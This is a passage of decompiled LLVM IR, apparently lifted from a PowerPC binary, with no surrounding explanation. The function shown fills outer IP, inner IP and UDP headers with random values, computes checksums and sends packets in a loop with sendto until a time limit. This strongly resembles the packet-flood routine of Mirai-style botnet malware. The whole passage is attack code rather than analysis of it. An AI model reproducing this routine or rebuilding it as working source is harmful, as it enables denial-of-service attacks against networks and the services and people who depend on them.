  %v0_100028b0 = phi i32 [ %v0_100028b0.pre, %dec_label_pc_10002898.loopexit ], [ %v1_1000272c, %dec_label_pc_10002714 ]
  %v0_100028a8 = phi i32 [ %v0_100028a8.pre, %dec_label_pc_10002898.loopexit ], [ %v1_10002730, %dec_label_pc_10002714 ]
  store i32 %v0_10002734, i32* %r8.global-to-local, align 4
  store i32 65535, i32* %r0.global-to-local, align 4
  %v0_100028a4 = load i32, i32* %r14.global-to-local, align 4
  %v3_100028a4 = icmp eq i32 %v0_100028a4, -1
  store i1 %v3_100028a4, i1* %cr2_eq.global-to-local, align 1
  %v4_100028a8 = icmp eq i32 %v0_100028a8, 65535
  store i1 %v4_100028a8, i1* %cr7_eq.global-to-local, align 1
  %v0_100028ac = load i32, i32* @r28, align 4
  %v4_100028ac = icmp eq i32 %v0_100028ac, 65535
  store i1 %v4_100028ac, i1* %cr3_eq.global-to-local, align 1
  %v4_100028b0 = icmp eq i32 %v0_100028b0, 65535
  store i1 %v4_100028b0, i1* %cr4_eq.global-to-local, align 1
  %v0_100028b4 = load i32, i32* %r17.global-to-local, align 4
  %v1_100028b4 = add i32 %v0_100028b4, 8
  store i32 %v1_100028b4, i32* @r24, align 4
  %v0_100028b8 = call i32 @__asm_mfcr()
  store i32 %v0_100028b8, i32* %r3.global-to-local, align 4
  %v1_100028bc = mul i32 %v0_100028b8, 268435456
  store i32 %v1_100028bc, i32* %r19.global-to-local, align 4
  %v0_100028c0 = load i32, i32* %r8.global-to-local, align 4
  %v3_100028c0 = icmp eq i32 %v0_100028c0, 0
  store i1 %v3_100028c0, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_1000268c, i32* %r8.global-to-local, align 4
  %v0_100028c8 = load i32, i32* %r17.global-to-local, align 4
  %v1_100028c8 = add i32 %v0_100028c8, 66
  store i32 %v1_100028c8, i32* %r23.global-to-local, align 4
  %v0_100028cc = call i32 @__asm_mfcr()
  store i32 %v0_100028cc, i32* %r3.global-to-local, align 4
  %v1_100028d0 = mul i32 %v0_100028cc, 268435456
  store i32 %v1_100028d0, i32* %r20.global-to-local, align 4
  %v2_100028d4 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %v2_100028d4, i32* %r16.global-to-local, align 4
  %v0_100028d8 = load i32, i32* %r8.global-to-local, align 4
  %v3_100028d8 = icmp eq i32 %v0_100028d8, 0
  store i1 %v3_100028d8, i1* %cr7_eq.global-to-local, align 1
  %v2_100028dc = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_100028dc, i32* %r15.global-to-local, align 4
  %v2_100028e0 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_100028e0, i32* %r14.global-to-local, align 4
  %v0_100028e4 = call i32 @__asm_mfcr()
  store i32 %v0_100028e4, i32* %r3.global-to-local, align 4
  %v1_100028e8 = mul i32 %v0_100028e4, 268435456
  store i32 %v1_100028e8, i32* %r21.global-to-local, align 4
  %v2_100028f8 = urem i32 %v0_10002724, 16
  %v1_10002900 = mul nuw i32 %v2_100028f8, 268435456
  %v2_100029b4 = ptrtoint i32* %stack_var_-106 to i32
  br label %dec_label_pc_100028ec

dec_label_pc_100028ec:                            ; preds = %dec_label_pc_10002a64, %dec_label_pc_10002898
  store i32 0, i32* %stack_var_-120, align 4
  store i32 %v2_100028f8, i32* %r0.global-to-local, align 4
  %v1_100028fc = call %0 @__asm_mtcrf(i32 1, i32 %v2_100028f8)
  store i32 %v1_10002900, i32* %r0.global-to-local, align 4
  %v0_10002904 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002904, label %dec_label_pc_10002a64, label %dec_label_pc_10002908

dec_label_pc_10002908:                            ; preds = %dec_label_pc_100028ec
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000290c

dec_label_pc_1000290c:                            ; preds = %dec_label_pc_100029d0, %dec_label_pc_10002908
  %v0_1000290c = phi i32 [ %v1_10002a54, %dec_label_pc_100029d0 ], [ 0, %dec_label_pc_10002908 ]
  %v1_1000290c = mul i32 %v0_1000290c, 24
  store i32 %v1_1000290c, i32* %r0.global-to-local, align 4
  %v1_10002910 = mul i32 %v0_1000290c, 4
  store i32 %v1_10002910, i32* %r11.global-to-local, align 4
  %v1_10002914 = load i32, i32* @r22, align 4
  %v2_10002914 = add i32 %v1_10002914, %v1_10002910
  %v3_10002914 = inttoptr i32 %v2_10002914 to i32*
  %v4_10002914 = load i32, i32* %v3_10002914, align 4
  store i32 %v4_10002914, i32* @r28, align 4
  %v1_10002918 = load i32, i32* @r26, align 4
  %v2_10002918 = add i32 %v1_10002918, %v1_1000290c
  store i32 %v2_10002918, i32* %r10.global-to-local, align 4
  %v1_1000291c = add i32 %v2_10002918, 20
  %v2_1000291c = inttoptr i32 %v1_1000291c to i8*
  %v3_1000291c = load i8, i8* %v2_1000291c, align 1
  %v4_1000291c = zext i8 %v3_1000291c to i32
  store i32 %v4_1000291c, i32* %r9.global-to-local, align 4
  %v1_10002920 = add i32 %v4_10002914, 24
  store i32 %v1_10002920, i32* @r31, align 4
  %v1_10002924 = add i32 %v4_10002914, 38
  store i32 %v1_10002924, i32* @r27, align 4
  %v1_10002928 = add i32 %v4_10002914, 58
  store i32 %v1_10002928, i32* @r30, align 4
  %v3_1000292c = icmp eq i8 %v3_1000291c, 31
  store i1 %v3_1000292c, i1* %cr7_eq.global-to-local, align 1
  %tmp36 = icmp ult i8 %v3_1000291c, 32
  br i1 %tmp36, label %dec_label_pc_10002ad8, label %dec_label_pc_10002934

dec_label_pc_10002934:                            ; preds = %dec_label_pc_1000290c
  %v0_10002934 = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10002934, label %dec_label_pc_10002b5c, label %dec_label_pc_10002938

dec_label_pc_10002938:                            ; preds = %dec_label_pc_10002ad8, %dec_label_pc_10002934
  %v0_10002938 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10002938, label %dec_label_pc_10002b04, label %dec_label_pc_1000293c

dec_label_pc_1000293c:                            ; preds = %dec_label_pc_10002b5c, %dec_label_pc_10002938
  %v0_1000293c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1000293c, label %dec_label_pc_10002b20, label %dec_label_pc_10002940

dec_label_pc_10002940:                            ; preds = %dec_label_pc_10002b04, %dec_label_pc_1000293c
  %v0_10002940 = load i32, i32* %r19.global-to-local, align 4
  %v1_10002940 = mul i32 %v0_10002940, 16
  %v2_10002940 = udiv i32 %v0_10002940, 268435456
  %v3_10002940 = or i32 %v2_10002940, %v1_10002940
  store i32 %v3_10002940, i32* %r19.global-to-local, align 4
  %v1_10002944 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10002940)
  %v1_10002948 = mul nuw i32 %v2_10002940, 268435456
  %v2_10002948 = urem i32 %v0_10002940, 268435456
  %v3_10002948 = or i32 %v1_10002948, %v2_10002948
  store i32 %v3_10002948, i32* %r19.global-to-local, align 4
  %v0_1000294c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000294c, label %dec_label_pc_10002b38, label %dec_label_pc_10002950

dec_label_pc_10002950:                            ; preds = %dec_label_pc_10002b20, %dec_label_pc_10002940
  %v0_10002950 = load i32, i32* %r20.global-to-local, align 4
  %v1_10002950 = mul i32 %v0_10002950, 16
  %v2_10002950 = udiv i32 %v0_10002950, 268435456
  %v3_10002950 = or i32 %v2_10002950, %v1_10002950
  store i32 %v3_10002950, i32* %r20.global-to-local, align 4
  %v1_10002954 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10002950)
  %v1_10002958 = mul nuw i32 %v2_10002950, 268435456
  %v2_10002958 = urem i32 %v0_10002950, 268435456
  %v3_10002958 = or i32 %v1_10002958, %v2_10002958
  store i32 %v3_10002958, i32* %r20.global-to-local, align 4
  %v0_1000295c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000295c, label %dec_label_pc_10002b50, label %dec_label_pc_10002960

dec_label_pc_10002960:                            ; preds = %dec_label_pc_10002b38, %dec_label_pc_10002950
  %v0_10002960 = load i32, i32* @r28, align 4
  %v1_10002960 = add i32 %v0_10002960, 16
  %v2_10002960 = inttoptr i32 %v1_10002960 to i32*
  %v3_10002960 = load i32, i32* %v2_10002960, align 4
  store i32 %v3_10002960, i32* %r0.global-to-local, align 4
  %v1_10002964 = load i32, i32* @r27, align 4
  %v2_10002964 = add i32 %v1_10002964, 16
  %v3_10002964 = inttoptr i32 %v2_10002964 to i32*
  store i32 %v3_10002960, i32* %v3_10002964, align 4
  br label %dec_label_pc_10002968

dec_label_pc_10002968:                            ; preds = %dec_label_pc_10002b50, %dec_label_pc_10002960
  %v0_10002968 = call i32 @rand_next()
  store i32 %v0_10002968, i32* %r3.global-to-local, align 4
  store i32 %v0_10002968, i32* %stack_var_-116, align 4
  %v0_10002970 = call i32 @rand_next()
  store i32 %v0_10002970, i32* %r3.global-to-local, align 4
  store i32 %v0_10002970, i32* %stack_var_-112, align 4
  %v0_10002978 = call i32 @rand_next()
  store i32 %v0_10002978, i32* %stack_var_-108, align 4
  %v0_10002984 = load i32, i32* @r31, align 4
  store i32 %v0_10002984, i32* %r3.global-to-local, align 4
  store i32 268446096, i32* @lr, align 4
  %v3_1000298c = call i32 @util_memcpy(i32 %v0_10002984, i32 %v2_100028d4, i32 4)
  %v0_10002990 = load i32, i32* @r31, align 4
  %v1_10002990 = add i32 %v0_10002990, 6
  store i32 %v1_10002990, i32* %r3.global-to-local, align 4
  store i32 268446112, i32* @lr, align 4
  %v3_1000299c = call i32 @util_memcpy(i32 %v1_10002990, i32 %v2_100028dc, i32 4)
  %v0_100029a0 = load i32, i32* @r31, align 4
  %v1_100029a0 = add i32 %v0_100029a0, 4
  store i32 %v1_100029a0, i32* %r3.global-to-local, align 4
  store i32 268446128, i32* @lr, align 4
  %v3_100029ac = call i32 @util_memcpy(i32 %v1_100029a0, i32 %v2_100028e0, i32 2)
  %v0_100029b0 = load i32, i32* @r31, align 4
  %v1_100029b0 = add i32 %v0_100029b0, 10
  store i32 %v1_100029b0, i32* %r3.global-to-local, align 4
  store i32 268446144, i32* @lr, align 4
  %v3_100029bc = call i32 @util_memcpy(i32 %v1_100029b0, i32 %v2_100029b4, i32 2)
  store i32 %v3_100029bc, i32* %r3.global-to-local, align 4
  %v0_100029c0 = load i32, i32* %r21.global-to-local, align 4
  %v1_100029c0 = mul i32 %v0_100029c0, 16
  %v2_100029c0 = udiv i32 %v0_100029c0, 268435456
  %v3_100029c0 = or i32 %v2_100029c0, %v1_100029c0
  store i32 %v3_100029c0, i32* %r21.global-to-local, align 4
  %v1_100029c4 = call %0 @__asm_mtcrf(i32 1, i32 %v3_100029c0)
  %v1_100029c8 = mul nuw i32 %v2_100029c0, 268435456
  %v2_100029c8 = urem i32 %v0_100029c0, 268435456
  %v3_100029c8 = or i32 %v1_100029c8, %v2_100029c8
  store i32 %v3_100029c8, i32* %r21.global-to-local, align 4
  %v0_100029cc = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100029cc, label %dec_label_pc_100029d0, label %dec_label_pc_10002b6c

dec_label_pc_100029d0:                            ; preds = %dec_label_pc_10002968, %dec_label_pc_10002b6c
  store i32 0, i32* %r29.global-to-local, align 4
  %v2_100029d8 = load i32, i32* @r28, align 4
  %v3_100029d8 = add i32 %v2_100029d8, 10
  %v4_100029d8 = inttoptr i32 %v3_100029d8 to i16*
  store i16 0, i16* %v4_100029d8, align 2
  %v0_100029dc = load i32, i32* @r28, align 4
  store i32 %v0_100029dc, i32* @r3, align 4
  %v2_100029e0 = call i32 @checksum_generic(i32 %v0_100029dc, i32 20)
  %v3_100029e0 = trunc i32 %v2_100029e0 to i16
  %v3_100029e8 = load i32, i32* @r28, align 4
  %v4_100029e8 = add i32 %v3_100029e8, 10
  %v5_100029e8 = inttoptr i32 %v4_100029e8 to i16*
  store i16 %v3_100029e0, i16* %v5_100029e8, align 2
  %v0_100029ec = load i32, i32* @r27, align 4
  store i32 %v0_100029ec, i32* @r3, align 4
  %v0_100029f0 = load i32, i32* %r29.global-to-local, align 4
  %v1_100029f0 = trunc i32 %v0_100029f0 to i16
  %v3_100029f0 = add i32 %v0_100029ec, 10
  %v4_100029f0 = inttoptr i32 %v3_100029f0 to i16*
  store i16 %v1_100029f0, i16* %v4_100029f0, align 2
  %v2_100029f4 = call i32 @checksum_generic(i32 %v0_100029ec, i32 20)
  %v3_100029f4 = trunc i32 %v2_100029f4 to i16
  %v0_100029f8 = load i32, i32* @r30, align 4
  store i32 %v0_100029f8, i32* @r4, align 4
  %v3_100029fc = load i32, i32* @r27, align 4
  %v4_100029fc = add i32 %v3_100029fc, 10
  %v5_100029fc = inttoptr i32 %v4_100029fc to i16*
  store i16 %v3_100029f4, i16* %v5_100029fc, align 2
  %v0_10002a00 = load i32, i32* @r24, align 4
  %v0_10002a04 = load i32, i32* %r29.global-to-local, align 4
  %v1_10002a04 = trunc i32 %v0_10002a04 to i16
  %v2_10002a04 = load i32, i32* @r30, align 4
  %v3_10002a04 = add i32 %v2_10002a04, 6
  %v4_10002a04 = inttoptr i32 %v3_10002a04 to i16*
  store i16 %v1_10002a04, i16* %v4_10002a04, align 2
  %v0_10002a08 = load i32, i32* @r27, align 4
  store i32 %v0_10002a08, i32* %r3.global-to-local, align 4
  %v0_10002a0c = load i32, i32* @r30, align 4
  %v1_10002a0c = add i32 %v0_10002a0c, 4
  %v2_10002a0c = inttoptr i32 %v1_10002a0c to i16*
  %v3_10002a0c = load i16, i16* %v2_10002a0c, align 2
  %v4_10002a0c = zext i16 %v3_10002a0c to i32
  %v4_10002a10 = call i32 @checksum_tcpudp(i32 %v0_10002a08, i32 %v0_100029f8, i32 %v4_10002a0c, i32 %v0_10002a00)
  %v5_10002a10 = trunc i32 %v4_10002a10 to i16
  store i32 %v4_10002a10, i32* %r3.global-to-local, align 4
  %v3_10002a14 = load i32, i32* %stack_var_-120, align 4
  store i32 %v3_10002a14, i32* %r0.global-to-local, align 4
  %v0_10002a18 = load i32, i32* @r28, align 4
  %v1_10002a18 = add i32 %v0_10002a18, 16
  %v2_10002a18 = inttoptr i32 %v1_10002a18 to i32*
  %v3_10002a18 = load i32, i32* %v2_10002a18, align 4
  store i32 %v3_10002a18, i32* %r11.global-to-local, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  %v1_10002a20 = mul i32 %v3_10002a14, 24
  store i32 %v1_10002a20, i32* %r0.global-to-local, align 4
  %v3_10002a24 = load i32, i32* @r30, align 4
  %v4_10002a24 = add i32 %v3_10002a24, 6
  %v5_10002a24 = inttoptr i32 %v4_10002a24 to i16*
  store i16 %v5_10002a10, i16* %v5_10002a24, align 2
  %v0_10002a28 = load i32, i32* @r28, align 4
  %v0_10002a2c = load i32, i32* @r25, align 4
  store i32 %v0_10002a2c, i32* %r3.global-to-local, align 4
  %v0_10002a30 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002a30 = load i32, i32* @r26, align 4
  %v2_10002a30 = add i32 %v1_10002a30, %v0_10002a30
  %v0_10002a34 = load i32, i32* %r9.global-to-local, align 4
  %v3_10002a34 = trunc i32 %v0_10002a34 to i16
  %v5_10002a34 = inttoptr i32 %v2_10002a30 to i16*
  store i16 %v3_10002a34, i16* %v5_10002a34, align 2
  %v0_10002a38 = load i32, i32* %r11.global-to-local, align 4
  %v2_10002a38 = add i32 %v2_10002a30, 4
  %v3_10002a38 = inttoptr i32 %v2_10002a38 to i32*
  store i32 %v0_10002a38, i32* %v3_10002a38, align 4
  %v0_10002a3c = load i32, i32* %r23.global-to-local, align 4
  %v0_10002a40 = load i32, i32* %r29.global-to-local, align 4
  %v1_10002a40 = trunc i32 %v0_10002a40 to i16
  %v3_10002a40 = add i32 %v2_10002a30, 2
  %v4_10002a40 = inttoptr i32 %v3_10002a40 to i16*
  store i16 %v1_10002a40, i16* %v4_10002a40, align 2
  store i32 16, i32* %r8.global-to-local, align 4
  store i32 268446288, i32* @lr, align 4
  %v6_10002a4c = call i32 @__libc_sendto(i32 %v0_10002a2c, i32 %v0_10002a28, i32 %v0_10002a3c, i32 16384, i32 %v2_10002a30, i32 16)
  store i32 %v6_10002a4c, i32* %r3.global-to-local, align 4
  %v3_10002a50 = load i32, i32* %stack_var_-120, align 4
  %v1_10002a54 = add i32 %v3_10002a50, 1
  store i32 %v1_10002a54, i32* %r9.global-to-local, align 4
  %v1_10002a58 = load i32, i32* %r18.global-to-local, align 4
  %v2_10002a58 = icmp slt i32 %v1_10002a54, %v1_10002a58
  %v4_10002a58 = icmp eq i32 %v1_10002a54, %v1_10002a58
  store i1 %v4_10002a58, i1* %cr7_eq.global-to-local, align 1
  store i32 %v1_10002a54, i32* %stack_var_-120, align 4
  br i1 %v2_10002a58, label %dec_label_pc_1000290c, label %dec_label_pc_10002a64

dec_label_pc_10002a64:                            ; preds = %dec_label_pc_100029d0, %dec_label_pc_100028ec
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10002a68 = call i32 @__GI_time()
  store i32 %v0_10002a68, i32* %r3.global-to-local, align 4
  store i32 %v2_100026d0, i32* %r0.global-to-local, align 4
  %v2_10002a70 = icmp slt i32 %v2_100026d0, %v0_10002a68
  %v4_10002a70 = icmp eq i32 %v2_100026d0, %v0_10002a68
  store i1 %v4_10002a70, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10002a70, label %dec_label_pc_10002a78, label %dec_label_pc_100028ec

dec_label_pc_10002a78:                            ; preds = %dec_label_pc_10002a64, %entry, %dec_label_pc_10002b88
  store i32 %v0_10002564, i32* %r0.global-to-local, align 4
  %v1_10002a8c = call %0 @__asm_mtcrf(i32 56, i32 %v0_10002540)
  store i32 %v0_1000257c, i32* %r21.global-to-local, align 4
  store i32 %v0_10002584, i32* %r23.global-to-local, align 4
  store i32 %v0_10002588, i32* %r24.global-to-local, align 4
  store i32 %v0_100025a0, i32* %r29.global-to-local, align 4
  store i32 %v0_100025a8, i32* %r30.global-to-local, align 4
  store i32 %v0_100025ac, i32* %r31.global-to-local, align 4
  %v0_10002ad4 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10002ad4

dec_label_pc_10002ad8:                            ; preds = %dec_label_pc_1000290c
  %v1_10002ad8 = add i32 %v2_10002918, 16
  %v2_10002ad8 = inttoptr i32 %v1_10002ad8 to i32*
  %v3_10002ad8 = load i32, i32* %v2_10002ad8, align 4
  store i32 %v3_10002ad8, i32* %r29.global-to-local, align 4
  %v0_10002adc = call i32 @rand_next()
  store i32 %v0_10002adc, i32* %r3.global-to-local, align 4
  %v3_10002ae0 = load i32, i32* %stack_var_-120, align 4
  %v1_10002ae4 = mul i32 %v3_10002ae0, 24
  %v1_10002ae8 = load i32, i32* @r26, align 4
  %v2_10002ae8 = add i32 %v1_10002ae8, %v1_10002ae4
  store i32 %v2_10002ae8, i32* %r9.global-to-local, align 4
  %v1_10002aec = add i32 %v2_10002ae8, 20
  %v2_10002aec = inttoptr i32 %v1_10002aec to i8*
  %v3_10002aec = load i8, i8* %v2_10002aec, align 1
  %v4_10002aec = zext i8 %v3_10002aec to i32
  store i32 %v4_10002aec, i32* %r0.global-to-local, align 4
  %tmp = urem i8 %v3_10002aec, 64
  %v2_10002af0 = zext i8 %tmp to i32
  %v3_10002af0 = lshr i32 %v0_10002adc, %v2_10002af0
  %v1_10002af4 = load i32, i32* %r29.global-to-local, align 4
  %v2_10002af4 = add i32 %v3_10002af0, %v1_10002af4
  store i32 %v2_10002af4, i32* %r3.global-to-local, align 4
  %v1_10002af8 = load i32, i32* @r28, align 4
  %v2_10002af8 = add i32 %v1_10002af8, 16
  %v3_10002af8 = inttoptr i32 %v2_10002af8 to i32*
  store i32 %v2_10002af4, i32* %v3_10002af8, align 4
  %v0_10002afc = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_10002afc, label %dec_label_pc_10002b5c, label %dec_label_pc_10002938

dec_label_pc_10002b04:                            ; preds = %dec_label_pc_10002b5c, %dec_label_pc_10002938
  %v0_10002b04 = call i32 @rand_next()
  %v1_10002b08 = urem i32 %v0_10002b04, 65536
  store i32 %v1_10002b08, i32* %r3.global-to-local, align 4
  %v1_10002b0c = add nsw i32 %v1_10002b08, -1000
  store i32 %v1_10002b0c, i32* %r0.global-to-local, align 4
  %v1_10002b10 = trunc i32 %v0_10002b04 to i16
  %v2_10002b10 = load i32, i32* @r28, align 4
  %v3_10002b10 = add i32 %v2_10002b10, 4
  %v4_10002b10 = inttoptr i32 %v3_10002b10 to i16*
  store i16 %v1_10002b10, i16* %v4_10002b10, align 2
  %v0_10002b14 = load i32, i32* %r0.global-to-local, align 4
  %v1_10002b14 = sub i32 -1, %v0_10002b14
  store i32 %v1_10002b14, i32* %r0.global-to-local, align 4
  %v1_10002b18 = trunc i32 %v1_10002b14 to i16
  %v2_10002b18 = load i32, i32* @r27, align 4
  %v3_10002b18 = add i32 %v2_10002b18, 4
  %v4_10002b18 = inttoptr i32 %v3_10002b18 to i16*
  store i16 %v1_10002b18, i16* %v4_10002b18, align 2
  %v0_10002b1c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10002b1c, label %dec_label_pc_10002b20, label %dec_label_pc_10002940

dec_label_pc_10002b20:                            ; preds = %dec_label_pc_10002b04, %dec_label_pc_1000293c
  %v0_10002b20 = call i32 @rand_next()
  %v1_10002b20 = trunc i32 %v0_10002b20 to i16
  store i32 %v0_10002b20, i32* %r3.global-to-local, align 4
  %v0_10002b24 = load i32, i32* %r19.global-to-local, align 4
  %v1_10002b24 = mul i32 %v0_10002b24, 16
  %v2_10002b24 = udiv i32 %v0_10002b24, 268435456
  %v3_10002b24 = or i32 %v2_10002b24, %v1_10002b24
  store i32 %v3_10002b24, i32* %r19.global-to-local, align 4
  %v1_10002b28 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10002b24)
  %v1_10002b2c = mul nuw i32 %v2_10002b24, 268435456
  %v2_10002b2c = urem i32 %v0_10002b24, 268435456
  %v3_10002b2c = or i32 %v1_10002b2c, %v2_10002b2c
  store i32 %v3_10002b2c, i32* %r19.global-to-local, align 4
  %v3_10002b30 = load i32, i32* @r28, align 4
  %v4_10002b30 = add i32 %v3_10002b30, 58
  %v5_10002b30 = inttoptr i32 %v4_10002b30 to i16*
  store i16 %v1_10002b20, i16* %v5_10002b30, align 2
  %v0_10002b34 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002b34, label %dec_label_pc_10002b38, label %dec_label_pc_10002950

dec_label_pc_10002b38:                            ; preds = %dec_label_pc_10002b20, %dec_label_pc_10002940
  %v0_10002b38 = call i32 @rand_next()
  %v1_10002b38 = trunc i32 %v0_10002b38 to i16
  store i32 %v0_10002b38, i32* %r3.global-to-local, align 4
  %v0_10002b3c = load i32, i32* %r20.global-to-local, align 4
  %v1_10002b3c = mul i32 %v0_10002b3c, 16
  %v2_10002b3c = udiv i32 %v0_10002b3c, 268435456
  %v3_10002b3c = or i32 %v2_10002b3c, %v1_10002b3c
  store i32 %v3_10002b3c, i32* %r20.global-to-local, align 4
  %v1_10002b40 = call %0 @__asm_mtcrf(i32 1, i32 %v3_10002b3c)
  %v1_10002b44 = mul nuw i32 %v2_10002b3c, 268435456
  %v2_10002b44 = urem i32 %v0_10002b3c, 268435456
  %v3_10002b44 = or i32 %v1_10002b44, %v2_10002b44
  store i32 %v3_10002b44, i32* %r20.global-to-local, align 4
  %v3_10002b48 = load i32, i32* @r30, align 4
  %v4_10002b48 = add i32 %v3_10002b48, 2
  %v5_10002b48 = inttoptr i32 %v4_10002b48 to i16*
  store i16 %v1_10002b38, i16* %v5_10002b48, align 2
  %v0_10002b4c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10002b4c, label %dec_label_pc_10002b50, label %dec_label_pc_10002960

dec_label_pc_10002b50:                            ; preds = %dec_label_pc_10002b38, %dec_label_pc_10002950
  %v0_10002b50 = call i32 @rand_next()
  store i32 %v0_10002b50, i32* %r3.global-to-local, align 4
  %v1_10002b54 = load i32, i32* @r27, align 4
  %v2_10002b54 = add i32 %v1_10002b54, 16
  %v3_10002b54 = inttoptr i32 %v2_10002b54 to i32*
  store i32 %v0_10002b50, i32* %v3_10002b54, align 4
  br label %dec_label_pc_10002968

dec_label_pc_10002b5c:                            ; preds = %dec_label_pc_10002ad8, %dec_label_pc_10002934
  %v0_10002b5c = call i32 @rand_next()
  store i32 %v0_10002b5c, i32* %r3.global-to-local, align 4
  %v1_10002b60 = load i32, i32* @r28, align 4
  %v2_10002b60 = add i32 %v1_10002b60, 12
  %v3_10002b60 = inttoptr i32 %v2_10002b60 to i32*
  store i32 %v0_10002b5c, i32* %v3_10002b60, align 4
  %v0_10002b64 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10002b64, label %dec_label_pc_10002b04, label %dec_label_pc_1000293c

dec_label_pc_10002b6c:                            ; preds = %dec_label_pc_10002968
  %v0_10002b6c = load i32, i32* @r30, align 4
  %v1_10002b6c = add i32 %v0_10002b6c, 8
  store i32 %v1_10002b6c, i32* @r29, align 4
  %v0_10002b70 = load i32, i32* %r17.global-to-local, align 4
  store i32 %v0_10002b70, i32* @r4, align 4
  store i32 %v1_10002b6c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10002b7c.77 to i32), i32* @lr, align 4
  %v0_10002b78 = call i32 @rand_alphastr()
  store i32 %v0_10002b78, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10002b80 = load i32, i32* @r29, align 4
  %v2_10002b80 = load i32, i32* %r17.global-to-local, align 4
  %v4_10002b80 = add i32 %v2_10002b80, %v1_10002b80
  %v5_10002b80 = inttoptr i32 %v4_10002b80 to i8*
  store i8 0, i8* %v5_10002b80, align 1
  br label %dec_label_pc_100029d0

dec_label_pc_10002b88:                            ; preds = %dec_label_pc_100026f0
  %v0_10002b88 = load i32, i32* @r25, align 4
  store i32 %v0_10002b88, i32* @r3, align 4
  %v0_10002b8c = call i32 @__GI___libc_close()
  store i32 %v0_10002b8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10002a78

; uselistorder directives
  uselistorder i32 %v0_10002b3c, { 2, 1, 0 }
  uselistorder i32 %v0_10002b38, { 1, 0 }
  uselistorder i32 %v0_10002b24, { 2, 1, 0 }
  uselistorder i32 %v0_10002b20, { 1, 0 }
  uselistorder i32 %v1_10002b14, { 1, 0 }
  uselistorder i32 %v1_10002b08, { 1, 0 }
  uselistorder i32 %v0_10002b04, { 1, 0 }
  uselistorder i32 %v0_10002a68, { 1, 0, 2 }
  uselistorder i32 %v1_10002a54, { 0, 3, 2, 4, 1 }
  uselistorder i32 %v2_10002a30, { 0, 2, 1, 3 }
  uselistorder i32 %v4_10002a10, { 1, 0 }
  uselistorder i32 %v0_100029c0, { 2, 1, 0 }
  uselistorder i32 %v0_10002950, { 2, 1, 0 }
  uselistorder i32 %v0_10002940, { 2, 1, 0 }
  uselistorder i32 %v4_10002914, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10002910, { 1, 0 }
  uselistorder i32 %v2_100028f8, { 2, 1, 0 }
  uselistorder i32 %v1_1000286c, { 1, 0 }
  uselistorder i32 %v4_100027c4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100027b8, { 1, 0 }
  uselistorder i32 %v0_100027b8, { 1, 0 }
  uselistorder i32 %v1_100027ac, { 1, 0 }
  uselistorder i32 %v1_1000278c, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10002748, { 2, 1, 0 }
  uselistorder i32 %v0_10002748, { 1, 2, 3, 0 }
  uselistorder i32 %v0_10002734, { 1, 0 }
  uselistorder i32 %v1_10002730, { 1, 0 }
  uselistorder i32 %v1_1000272c, { 1, 0 }
  uselistorder i32 %v2_100026d0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-120, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 14, 15, 8, 9, 16, 17 }
  uselistorder i32* %r31.global-to-local, { 0, 1, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 3, 4, 17, 18, 19, 20, 21 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 3, 4, 5, 6, 7, 8, 9, 10, 2, 11, 12 }
  uselistorder i32* %r3.global-to-local, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 44, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 2, 1, 0, 27, 28, 29, 3, 30, 45, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 4 }
  uselistorder i32* %r29.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 13, 10, 11, 12, 14 }
  uselistorder i32* %r20.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8, 9 }
  uselistorder i32* %r19.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 19, 20, 26, 21, 22, 23, 24, 25, 27, 28, 29, 30, 31, 15, 16, 32, 33, 34, 35, 36 }
  uselistorder i1* %cr7_eq.global-to-local, { 2, 3, 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 66, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10002a78, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100029d0, { 1, 0 }
  uselistorder label %dec_label_pc_10002858, { 1, 0 }
